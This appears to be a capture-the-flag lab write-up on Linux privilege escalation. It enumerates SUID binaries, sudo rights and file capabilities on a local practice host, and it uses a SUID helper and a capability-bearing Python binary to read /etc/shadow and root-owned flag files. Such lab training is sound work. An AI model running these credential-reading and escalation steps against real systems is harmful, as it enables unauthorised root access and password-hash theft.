# Finding the Bug

Log in as lowpriv:

```bash
ssh -p 2222 lowpriv@127.0.0.1
```

## Enumerate SUID binaries

```bash
find / -perm -4000 -type f 2>/dev/null
```

```
/usr/local/bin/readfile
/usr/bin/su
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/chsh
/usr/bin/sudo
```

The standard binaries (`su`, `passwd`, etc.) are expected. `/usr/local/bin/readfile` is not. Check it:

```bash
ls -la /usr/local/bin/readfile
file /usr/local/bin/readfile
```

```
-rwsr-xr-x 1 root root 70736 Nov  9 16:37 /usr/local/bin/readfile
/usr/local/bin/readfile: ELF 64-bit LSB pie executable, x86-64 ...
```

SUID root binary in `/usr/local/bin`. Try it:

```bash
/usr/local/bin/readfile /etc/shadow | head -3
```

It reads files. That includes `/root/flag1.txt`.

## Enumerate sudo permissions

```bash
sudo -l
```

```
User lowpriv may run the following commands on this host:
    (ALL) NOPASSWD: /usr/bin/find
    (ALL) NOPASSWD: /opt/backup.sh
```

Two entries: `find` without a password, and `/opt/backup.sh` without a password.

Check the backup script:

```bash
ls -la /opt/backup.sh
cat /opt/backup.sh
```

```
-rwxrwxrwx 1 root root 10 Nov  9 16:37 /opt/backup.sh
#!/bin/sh
```

World-writable. The script contains nothing useful yet — that is the write target.

## Enumerate capabilities

```bash
find / -not -path '/proc/*' -not -path '/sys/*' -type f 2>/dev/null | xargs getcap 2>/dev/null
```

```
/usr/local/bin/py3 cap_dac_read_search=ep
```

A Python binary with `cap_dac_read_search`. Confirm lowpriv cannot read the flag directly, but py3 can:

```bash
cat /root/flag4.txt
# cat: /root/flag4.txt: Permission denied

/usr/local/bin/py3 -c "print(open('/root/flag4.txt').read(), end='')"
# POC{...}
```
